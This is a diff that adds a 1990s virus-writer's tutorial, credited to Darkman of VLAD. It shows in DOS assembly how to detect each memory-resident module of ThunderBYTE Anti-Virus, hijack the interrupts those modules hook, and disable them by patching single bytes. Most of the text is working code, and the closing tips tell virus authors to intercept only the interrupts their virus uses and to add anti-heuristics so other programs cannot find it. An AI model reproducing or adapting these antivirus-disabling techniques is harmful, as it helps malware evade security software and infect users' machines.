@@ -1,0 +1,695 @@
+			T B A V   M O N I T O R
+			       Written by
+			      Darkman/VLAD
+
+  Thanks for the idea to Conzouler and The Unforgiven of Immortal Riot
+	      Read Immortal Riot's magazine Insane Reality
+
+
+------------
+Introduction
+------------
+
+  This document is an example of how to detect, intercept and enable/disable
+the memory resident programs of ThunderBYTE Anti-Virus: TbDriver, TbScanX,
+TbCheck, TbMem, TbFile, TbDisk and TbLog.
+
+-------------------------------
+Thunderbyte B.V. about TbDriver
+-------------------------------
+
+     Enable memory resident TBAV utilities: TbDriver
+
+     TbDriver does not provide much protection against viruses by itself, but
+     must be loaded in advance to enable the memory resident ThunderBYTE
+     Anti-Virus utilities, such as TbScanX, TbCheck, TbMem, TbFile and TbDisk
+     to perform properly. It also provides basic protection against ANSI
+     bombs and 'stealth' viruses.
+
+-----------------------------
+Interrupts hooked by TbDriver
+-----------------------------
+
+These interrupts are hooked by TbDriver:
+
+  INT 20h (DOS Program Terminate)
+  INT 21h (DOS Function call)
+  INT 27h (DOS Terminate and Stay Resident)
+  INT 29h (DOS Fast Console Output)
+  INT 2Fh (Software Multiplex)
+
+----------------------
+How to detect TbDriver
+----------------------
+
+The below code shows an example of how to detect TbDriver:
+
+;------------------------------------------------------------=< cut here >=-
+	     push    ds                  ; Save DS at stack
+	     xor     ax,ax               ; Clear AX
+	     mov     ds,ax               ; DS = segment of interrupt vectors
+	     lds     si,ds:[29h*04h]     ; Get address of interrupt 29h
+	     cmp     [si],2e53h          ; TbDriver resident?
+	     jne     detectexit          ; Not resident? Jump to detectexit
+
+; Intercept TbDriver here...
+
+detectexit:
+	     pop     ds                  ; Load DS from stack
+;------------------------------------------------------------=< cut here >=-
+
+This example must be used before interception of TbDriver.
+
+-------------------------
+How to intercept TbDriver
+-------------------------
+
+  The below code shows an example of how to intercept all interupts hooked
+by TbDriver:
+
+;------------------------------------------------------------=< cut here >=-
+	     lea     di,int29adr         ; DI = offset of int29adr
+	     add     si,43h              ; SI = offset of original INT 29h
+	     movsw                       ; Move address of original INT 29h
+	     movsw                       ;  "      "    "     "      "   "
+
+	     lea     di,int2fadr         ; DI = offset of int2fadr
+	     add     si,17h              ; SI = offset of original INT 2fh
+	     movsw                       ; Move address of original INT 2fh
+	     movsw                       ;  "      "    "     "      "   "
+
+	     lea     di,int21adr         ; DI = offset of int21adr
+	     add     si,0c4h             ; SI = offset of original INT 21h
+	     movsw                       ; Move address of original INT 21h
+	     movsw                       ;  "      "    "     "      "   "
+
+	     mov     ds,ax               ; DS = segment of interrupt vectors
+
+	     mov     word ptr ds:[20h*04h],offset int20h
+	     mov     ds:[20h*04h+02h],es ; Intercept interrupt 20h
+
+	     mov     word ptr ds:[21h*04h],offset int21h
+	     mov     ds:[21h*04h+02h],es ; Intercept interrupt 21h
+
+	     mov     word ptr ds:[27h*04h],offset int27h
+	     mov     ds:[27h*04h+02h],es ; Intercept interrupt 27h
+
+	     mov     word ptr ds:[29h*04h],offset int29h
+	     mov     ds:[29h*04h+02h],es ; Intercept interrupt 29h
+
+	     mov     word ptr ds:[2fh*04h],offset int2fh
+	     mov     ds:[2fh*04h+02h],es ; Intercept interrupt 2fh
+;------------------------------------------------------------=< cut here >=-
+
+--------------------------------------------------------
+Necessary procedures and variables to intercept TbDriver
+--------------------------------------------------------
+
+  These procedures and variable are necessary to emulate the original
+interrupts:
+
+;------------------------------------------------------------=< cut here >=-
+int20h       proc    near                ; DOS Program Terminate
+	     xor     ax,ax               ; Terminate program
+	     endp
+
+int21h       proc    near                ; DOS Function call
+	     db      0eah                ; Object code of jump far
+int21adr     dd      ?                   ; Address of interrupt 21h
+	     endp
+
+int27h       proc    near                ; DOS Terminate and Stay Resident
+	     mov     ah,31h              ; Terminate and stay resident
+	     mov     cl,04h              ; Multiply by paragraphs
+	     shr     dx,cl               ; Calculate paragraphs
+	     inc     dx                  ; Increase DX
+	     jmp     short int21h
+	     endp
+
+int29h       proc    near                ; DOS Fast Console Output
+	     db      0eah                ; Object code of jump far
+int29adr     dd      ?                   ; Address of interrupt 29h
+	     endp
+
+int2fh       proc    near                ; Software Multiplex
+	     db      0eah                ; Object code of jump far
+int2fadr     dd      ?                   ; Address of interrupt 2fh
+	     endp
+;------------------------------------------------------------=< cut here >=-
+
+------------------------------
+Thunderbyte B.V. about TbScanX
+------------------------------
+
+     Automatic scanning: TbScanX
+
+     TbScanX is the memory resident version of TbScan. This signature scanner
+     remains resident in memory and automatically scans those files which are
+     being executed, copied, de-archived, downloaded, etc. TbScanX does not
+     require much memory. It can swap itself into expanded, XMS, or high
+     memory, using only 1Kb of conventional memory.
+
+----------------------------
+Interrupts hooked by TbScanX
+----------------------------
+
+These interrupts are hooked by TbScanX:
+
+  INT 13h (BIOS Fixed disk/FDD Services)
+  INT 2Fh (Software Multiplex)
+
+  It may look like the below interrupt is hooked, because it pointers to the
+code of TbScanX, but it is NOT hooked:
+
+  INT E1h (BASIC Reserved)
+
+---------------------
+How to detect TbScanX
+---------------------
+
+The below code shows an example of how to detect TbScanX:
+
+;------------------------------------------------------------=< cut here >=-
+	     push    ds                  ; Save DS at stack
+	     xor     ax,ax               ; Clear AX
+	     mov     ds,ax               ; DS = segment of interrupt vectors
+	     lds     si,ds:[13h*04h]     ; Get address of interrupt 13h
+	     cmp     [si],2e9ch          ; TbScanX resident?
+	     jne     detectexit          ; Not resident? Jump to detectexit
+
+; Enable/disable or intercept TbScanX here...
+
+detectexit:
+	     pop     ds                  ; Load DS from stack
+;------------------------------------------------------------=< cut here >=-
+
+  You can't detect or intercept TbScanX probably if TbDisk has hooked the
+interrupt before or after, so please detect TbDisk before and after.
+
+This example must used before enable/disable or interception of TbScanX.
+
+------------------------
+How to intercept TbScanX
+------------------------
+
+  The below code shows an example of how to intercept interrupt 13h, which is
+hooked by TbScanX:
+
+;------------------------------------------------------------=< cut here >=-
+	     lea     di,int13adr         ; DI = offset of int13adr
+	     add     si,66h              ; SI = offset of original INT 13h
+	     movsw                       ; Move address of original INT 13h
+	     movsw                       ;  "      "    "     "      "   "
+
+	     mov     ds,ax               ; DS = segment of interrupt vectors
+
+	     mov     word ptr ds:[13h*04h],offset int13h
+	     mov     ds:[13h*04h+02h],es ; Intercept interrupt 13h
+;------------------------------------------------------------=< cut here >=-
+
+  It is easier to intercept interrupt 2fh from TbDriver, do that instead of
+intercepting it from TbScanX.
+
+-------------------------------------------------------
+Necessary procedures and variables to intercept TbScanX
+-------------------------------------------------------
+
+  These procedures and variable are necessary to emulate the original
+interrupts:
+
+;------------------------------------------------------------=< cut here >=-
+int13h       proc    near                ; BIOS Fixed disk/FDD Services
+	     db      0eah                ; Object code of jump far
+int13adr     dd      ?                   ; Address of interrupt 13h
+	     endp
+;------------------------------------------------------------=< cut here >=-
+
+---------------------
+How to enable TbScanX
+---------------------
+
+The below code shows an example of how to enable TbScanX:
+
+;------------------------------------------------------------=< cut here >=-
+	     mov     byte ptr ds:[si-12ch],00h
+;------------------------------------------------------------=< cut here >=-
+
+----------------------
+How to disable TbScanX
+----------------------
+
+The below code shows an example of how to disable TbScanX:
+
+;------------------------------------------------------------=< cut here >=-
+	     mov     byte ptr ds:[si-12ch],19h
+;------------------------------------------------------------=< cut here >=-
+
+------------------------------
+Thunderbyte B.V. about TbCheck
+------------------------------
+
+     Check while loading: TbCheck
+
+     TbCheck is a memory resident integrity checker. This program remains
+     resident in memory and checks automatically every file just before it is
+     being executed. TbCheck uses a fast integrity checking method, consuming
+     only 400 bytes of memory. It can be configured to reject files with
+     incorrect checksums, and/or to reject files that do not have a corres-
+     ponding Anti-Vir.Dat record.
+
+----------------------------
+Interrupts hooked by TbCheck
+----------------------------
+
+TbCheck does not hook interrupts.
+And therefore you do not need to intercept it.
+
+---------------------
+How to detect TbCheck
+---------------------
+
+The below code shows an example of how to detect TbCheck:
+
+;------------------------------------------------------------=< cut here >=-
+	     push    ds                  ; Save DS at stack
+	     xor     ax,ax               ; Clear AX
+	     mov     ds,ax               ; DS = segment of interrupt vectors
+	     lds     si,ds:[21h*04h]     ; Get address of interrupt 21h
+	     lds     si,ds:[si+75h]      ; Get address of TbCheck
+	     cmp     [si],3d9ch          ; TbCheck resident?
+	     jne     detectexit          ; Not resident? Jump to detectexit
+
+; Enable/disable TbCheck here...
+
+detectexit:
+	     pop     ds                  ; Load DS from stack
+;------------------------------------------------------------=< cut here >=-
+
+  You can't detect TbCheck probably if TbScanX, TbMem, TbFile, TbDisk or
+TbLog has hooked the interrupt before, so please detect them before.
+
+This example must used before enable/disable TbCheck.
+
+---------------------
+How to enable TbCheck
+---------------------
+
+The below code shows an example of how to enable TbCheck:
+
+;------------------------------------------------------------=< cut here >=-
+	     mov     byte ptr ds:[si-69h],00h
+;------------------------------------------------------------=< cut here >=-
+
+----------------------
+How to disable TbCheck
+----------------------
+
+The below code shows an example of how to disable TbCheck:
+
+;------------------------------------------------------------=< cut here >=-
+	     mov     byte ptr ds:[si-69h],01h
+;------------------------------------------------------------=< cut here >=-
+
+----------------------------
+Thunderbyte B.V. about TbMem
+----------------------------
+
+     Controlling memory: TbMem
+
+     TbMem detects attempts from programs to remain resident in memory, and
+     ensures that no program can remain resident in memory without permis-
+     sion. Since most viruses remain resident in memory, this is a powerful
+     weapon against all such viruses, known or unknown. Permission informa-
+     tion is maintained in the Anti-Vir.Dat files. TbMem also protects your
+     CMOS memory against unwanted modifications.
+
+--------------------------
+Interrupts hooked by TbMem
+--------------------------
+
+These interrupts are hooked by TbMem:
+
+  INT 09h (IRQ 1  Keyboard)
+  INT 2Fh (Software Multiplex)
+
+-------------------
+How to detect TbMem
+-------------------
+
+The below code shows an example of how to detect TbMem:
+
+;------------------------------------------------------------=< cut here >=-
+	     push    ds                  ; Save DS at stack
+	     xor     ax,ax               ; Clear AX
+	     mov     ds,ax               ; DS = segment of interrupt vectors
+	     lds     si,ds:[09h*04h]     ; Get address of interrupt 09h
+	     cmp     [si],2e50h          ; TbMem resident?
+	     jne     detectexit          ; Not resident? Jump to detectexit
+
+; Enable/disable or intercept TbMem here...
+
+detectexit:
+	     pop     ds                  ; Load DS from stack
+;------------------------------------------------------------=< cut here >=-
+
+This example must used before enable/disable or interception of TbMem.
+
+----------------------
+How to intercept TbMem
+----------------------
+
+  The below code shows an example of how to intercept interrupt 09h, which is
+hooked by TbMem:
+
+;------------------------------------------------------------=< cut here >=-
+	     lea     di,int09adr         ; DI = offset of int09adr
+	     add     si,3ch              ; SI = offset of original INT 09h
+	     movsw                       ; Move address of original INT 09h
+	     movsw                       ;  "      "    "     "      "   "
+
+	     mov     ds,ax               ; DS = segment of interrupt vectors
+
+	     mov     word ptr ds:[09h*04h],offset int09h
+	     mov     ds:[09h*04h+02h],es ; Intercept interrupt 09h
+;------------------------------------------------------------=< cut here >=-
+
+  It is easier to intercept interrupt 2fh from TbDriver, do that instead of
+intercepting it from TbMem.
+
+-----------------------------------------------------
+Necessary procedures and variables to intercept TbMem
+-----------------------------------------------------
+
+  These procedures and variable are necessary to emulate the original
+interrupts:
+
+;------------------------------------------------------------=< cut here >=-
+int09h       proc    near                ; IRQ 1  Keyboard
+	     db      0eah                ; Object code of jump far
+int09adr     dd      ?                   ; Address of interrupt 09h
+	     endp
+;------------------------------------------------------------=< cut here >=-
+
+-------------------
+How to enable TbMem
+-------------------
+
+The below code shows an example of how to enable TbMem:
+
+;------------------------------------------------------------=< cut here >=-
+	     mov     byte ptr ds:[si-253h],28h
+;------------------------------------------------------------=< cut here >=-
+
+--------------------
+How to disable TbMem
+--------------------
+
+The below code shows an example of how to disable TbMem:
+
+;------------------------------------------------------------=< cut here >=-
+	     mov     byte ptr ds:[si-253h],29h
+;------------------------------------------------------------=< cut here >=-
+
+-----------------------------
+Thunderbyte B.V. about TbFile
+-----------------------------
+
+     Preventing infection: TbFile
+
+     TbFile detects attempts from programs to infect other programs. It also
+     guards read-only attributes, detects illegal time-stamps, etc. It will
+     make sure that no virus succeeds in infecting programs.
+
+---------------------------
+Interrupts hooked by TbFile
+---------------------------
+
+TbFile does not hook interrupts.
+And therefore you do not need to intercept it.
+
+--------------------
+How to detect TbFile
+--------------------
+
+The below code shows an example of how to detect TbFile:
+
+;------------------------------------------------------------=< cut here >=-
+	     push    ds                  ; Save DS at stack
+	     xor     ax,ax               ; Clear AX
+	     mov     ds,ax               ; DS = segment of interrupt vectors
+	     lds     si,ds:[21h*04h]     ; Get address of interrupt 21h
+	     lds     si,ds:[si+75h]      ; Get address of TbFile
+	     cmp     [si],2e9ch          ; TbFile resident?
+	     jne     detectexit          ; Not resident? Jump to detectexit
+
+; Enable/disable TbFile here...
+
+detectexit:
+	     pop     ds                  ; Load DS from stack
+;------------------------------------------------------------=< cut here >=-
+
+  You can't detect TbFile probably if TbScanX, TbCheck, TbMem, TbDisk or
+TbLog has hooked the interrupt before, so please detect them before.
+
+This example must used before enable/disable TbFile.
+
+--------------------
+How to enable TbFile
+--------------------
+
+The below code shows an example of how to enable TbFile:
+
+;------------------------------------------------------------=< cut here >=-
+	     mov     byte ptr ds:[si-0c5h],00h
+;------------------------------------------------------------=< cut here >=-
+
+---------------------
+How to disable TbFile
+---------------------
+
+The below code shows an example of how to disable TbFile:
+
+;------------------------------------------------------------=< cut here >=-
+	     mov     byte ptr ds:[si-0c5h],01h
+;------------------------------------------------------------=< cut here >=-
+
+-----------------------------
+Thunderbyte B.V. about TbDisk
+-----------------------------
+
+     Protecting the disk: TbDisk
+
+     TbDisk is a disk guard program which detects attempts from programs to
+     write directly to disk (without using DOS), attempts to format, etc.,
+     and makes sure that no malicious program will succeed in destroying your
+     data. This utility also traps tunneling and direct calls into the BIOS
+     code. Permission information about the rare programs that write directly
+     and/or format the disk is maintained in the Anti-Vir.Dat files.
+
+---------------------------
+Interrupts hooked by TbDisk
+---------------------------
+
+These interrupts are hooked by TbDisk:
+
+  INT 13h (BIOS Fixed disk/FDD Services)
+  INT 15h (BIOS System Services)
+  INT 26h (DOS Absolute Disk Write)
+  INT 2Fh (Software Multiplex)
+  INT 40h (BIOS Diskette Service)
+
+--------------------
+How to detect TbDisk
+--------------------
+
+The below code shows an example of how to detect TbDisk:
+
+;------------------------------------------------------------=< cut here >=-
+	     push    ds                  ; Save DS at stack
+	     xor     ax,ax               ; Clear AX
+	     mov     ds,ax               ; DS = segment of interrupt vectors
+	     lds     si,ds:[26h*04h]     ; Get address of interrupt 26h
+	     cmp     [si],2e9ch          ; TbDisk resident?
+	     jne     detectexit          ; Not resident? Jump to detectexit
+
+; Enable/disable or intercept TbDisk here...
+
+detectexit:
+	     pop     ds                  ; Load DS from stack
+;------------------------------------------------------------=< cut here >=-
+
+  You can't detect or intercept TbDisk probably if TbScanX has hooked the
+interrupt before or after, so please detect TbScanX before and after.
+
+This example must used before enable/disable or interception of TbDisk.
+
+-----------------------
+How to intercept TbDisk
+-----------------------
+
+  The below code shows an example of how to intercept interrupt 13h, 15h, 26h
+and 40h, which is hooked by TbDisk:
+
+;------------------------------------------------------------=< cut here >=-
+	     lea     di,int26adr         ; DI = offset of int26adr
+	     add     si,0fh              ; SI = offset of original INT 26h
+	     movsw                       ; Move address of original INT 26h
+	     movsw                       ;  "      "    "     "      "   "
+
+	     lea     di,int40adr         ; DI = offset of int40adr
+	     add     si,18h              ; SI = offset of original INT 40h
+	     movsw                       ; Move address of original INT 40h
+	     movsw                       ;  "      "    "     "      "   "
+
+	     lea     di,int13adr         ; DI = offset of int13adr
+	     add     si,2bh              ; SI = offset of original INT 13h
+	     movsw                       ; Move address of original INT 13h
+	     movsw                       ;  "      "    "     "      "   "
+
+	     lea     di,int15adr         ; DI = offset of int15adr
+	     add     si,18h              ; SI = offset of original INT 15h
+	     movsw                       ; Move address of original INT 15h
+	     movsw                       ;  "      "    "     "      "   "
+
+	     mov     ds,ax               ; DS = segment of interrupt vectors
+
+	     mov     word ptr ds:[13h*04h],offset int13h
+	     mov     ds:[13h*04h+02h],es ; Intercept interrupt 13h
+
+	     mov     word ptr ds:[15h*04h],offset int15h
+	     mov     ds:[15h*04h+02h],es ; Intercept interrupt 15h
+
+	     mov     word ptr ds:[26h*04h],offset int26h
+	     mov     ds:[26h*04h+02h],es ; Intercept interrupt 26h
+
+	     mov     word ptr ds:[40h*04h],offset int40h
+	     mov     ds:[40h*04h+02h],es ; Intercept interrupt 40h
+;------------------------------------------------------------=< cut here >=-
+
+  It is easier to intercept interrupt 2fh from TbDriver, do that instead of
+intercepting it from TbDisk.
+
+------------------------------------------------------
+Necessary procedures and variables to intercept TbDisk
+------------------------------------------------------
+
+  These procedures and variable are necessary to emulate the original
+interrupts:
+
+;------------------------------------------------------------=< cut here >=-
+int13h       proc    near                ; BIOS Fixed disk/FDD Services
+	     db      0eah                ; Object code of jump far
+int13adr     dd      ?                   ; Address of interrupt 13h
+	     endp
+
+int15h       proc    near                ; BIOS System Services
+	     db      0eah                ; Object code of jump far
+int15adr     dd      ?                   ; Address of interrupt 15h
+	     endp
+
+int26h       proc    near                ; DOS Absolute Disk Write
+	     db      0eah                ; Object code of jump far
+int26adr     dd      ?                   ; Address of interrupt 26h
+	     endp
+
+int40h       proc    near                ; BIOS Diskette Service
+	     db      0eah                ; Object code of jump far
+int40adr     dd      ?                   ; Address of interrupt 40h
+	     endp
+;------------------------------------------------------------=< cut here >=-
+
+--------------------
+How to enable TbDisk
+--------------------
+
+The below code shows an example of how to enable TbDisk:
+
+;------------------------------------------------------------=< cut here >=-
+	     mov     byte ptr ds:[si-0bah],00h
+;------------------------------------------------------------=< cut here >=-
+
+---------------------
+How to disable TbDisk
+---------------------
+
+The below code shows an example of how to disable TbDisk:
+
+;------------------------------------------------------------=< cut here >=-
+	     mov     byte ptr ds:[si-0bah],01h
+;------------------------------------------------------------=< cut here >=-
+
+----------------------------
+Thunderbyte B.V. about TbLog
+----------------------------
+
+     The purpose of TbLog
+
+     TbLog is a TBAV log file utility. It writes a record into a log file
+     whenever one of the resident TBAV utilities pops up with an alert
+     message. Also when TbScan detects a virus a record will be written.
+
+--------------------------
+Interrupts hooked by TbLog
+--------------------------
+
+This interrupt is hooked by TbLog:
+
+  INT 2Fh (Software Multiplex)
+
+  It is easier to intercept interrupt 2fh from TbDriver, do that instead of
+intercepting it from TbLog.
+
+-------------------
+How to detect TbLog
+-------------------
+
+The below code shows an example of how to detect TbLog:
+
+;------------------------------------------------------------=< cut here >=-
+	     push    ds                  ; Save DS at stack
+	     xor     ax,ax               ; Clear AX
+	     mov     ds,ax               ; DS = segment of interrupt vectors
+	     lds     si,ds:[2fh*04h]     ; Get address of interrupt 2fh
+	     cmp     [si],0fd3dh         ; TbLog resident?
+	     jne     detectexit          ; Not resident? Jump to detectexit
+
+; Enable/disable TbLog here...
+
+detectexit:
+	     pop     ds                  ; Load DS from stack
+;------------------------------------------------------------=< cut here >=-
+
+  You can't detect TbLog probably if TbScanX, TbMem or TbDisk has hooked the
+interrupt before, so please detect them before.
+
+This example must used before enable/disable TbLog.
+
+-------------------
+How to enable TbLog
+-------------------
+
+The below code shows an example of how to enable TbLog:
+
+;------------------------------------------------------------=< cut here >=-
+	     mov     byte ptr ds:[si-0a2h],00h
+;------------------------------------------------------------=< cut here >=-
+
+--------------------
+How to disable TbLog
+--------------------
+
+The below code shows an example of how to disable TbLog:
+
+;------------------------------------------------------------=< cut here >=-
+	     mov     byte ptr ds:[si-0a2h],01h
+;------------------------------------------------------------=< cut here >=-
+
+---------------------
+Final tips and tricks
+---------------------
+
+- These examples were tested with ThunderBYTE Anti-Virus v 6.31.
+- Only intercept those interrupts the virus uses.
+- Use a lot anti-heuristic's, so other programs can't find the virus either.
+- Remember to optimize your code.
+
